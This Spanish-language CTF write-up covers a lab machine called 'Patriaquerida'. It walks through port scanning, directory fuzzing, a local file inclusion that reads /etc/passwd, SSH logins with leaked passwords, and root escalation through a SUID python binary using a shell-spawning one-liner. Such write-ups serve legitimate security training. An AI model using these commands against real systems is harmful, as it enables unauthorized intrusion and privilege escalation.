# MÁQUINA PATRIAQUERIDA

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto.JPG)

Vemos que estan abiertos tanto el puerto 80 como el 22, asi que iremos a ver el contenido de la pagina web:

![WEB](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto2.JPG)

Se trata de la pagina por defecto de Apache, no vemos nada raro ni aqui ni en el codigo fuente, por lo que vamos a realizar fuzzing con la herramienta de gobuster:

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
![INDEX](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto3.JPG)

Existe un index.php al cual podemos acceder:

![CTF](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto4.JPG)

Nos indica que hay un fichero oculto en la ruta de /var/www/html, en este directorio es donde se introducen las paginas que se muestran, por lo que ya nos encontramos en ese directorio, asi que bastara con poner el nombre de ese archivo:

![PASS](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto5.JPG)

Tenemos una posible contraseña, pero no sabemos para que usuario. Si intentamos hacer un ataque de fuerza bruta con la herramienta de Hydra veremos que no encuentra nada (o tarda mucho), por lo que al haber un fichero .php veremos si es explotable a un LFI. Para ello usaremos la herramienta de wfuzz:

```shell
wfuzz -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hl 0
```

![FUZZ](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto6.JPG)

Es vulnerable utilizando el parametro page, asi que vamos a leer el contenido del fichero /etc/passwd para ver los usuarios de la maquina:

![PASSWD](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto7.JPG)

Hay 2 que destacan: Mario y Pinguino, asi que probaremos a conectarnos via SSH a la maquina con uno de los 2 usuarios con la contraseña que hemos encontrado antes:

![SSH](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto8.JPG)

El usuario correcto era pinguino, ya estamos dentro. Si miramos el contenido del directorio home de este usuario encontramos un fichero llamado "nota_mario.txt" en el cual nos dan la contraseña del usuario mario:

![MARIO](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto9.JPG)

Ya somos el usuario Mario, si probamos a ejecutar el comando sudo -l veremos que no podemos ejecutar sudo con este usuario, por lo que lo siguiente sera mirar si hay algo por ahi con permisos de SUID que nos pueda ayudar a escalar, para ello usaremos el siguiente comando:

```shell
find -perm -4000 2>/dev/null
```

![SUID](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto10.JPG)

Vemos que Python tiene el SUID activado, si miramos en la pagina de GTFOBins encontraremos una posible manera de explotarlo para poder escalar privilegios:

```shell
https://gtfobins.github.io/gtfobins/python/#suid
```

La probamos:

```shell
./usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Patriaquerida/foto11.JPG)

Y ya somos root!
